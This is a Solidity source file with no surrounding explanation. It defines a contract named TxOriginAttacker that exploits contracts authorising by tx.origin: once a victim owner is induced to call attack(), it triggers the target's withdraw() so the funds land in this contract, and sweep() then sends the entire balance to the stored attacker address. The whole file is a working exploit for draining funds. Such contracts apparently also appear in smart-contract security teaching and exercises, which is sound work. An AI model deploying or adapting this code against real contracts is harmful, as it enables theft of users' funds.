// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITarget {
    function withdraw() external;
}

contract TxOriginAttacker {
    address payable public attacker;
    address public target;

    constructor(address payable _attacker, address _target) {
        attacker = _attacker;
        target = _target;
    }

    function attack() external {
        ITarget(target).withdraw();
    }

    receive() external payable {}

    function sweep() external {
        (bool ok,) = attacker.call{value: address(this).balance}("");
        require(ok, "Transfer failed");
    }
}
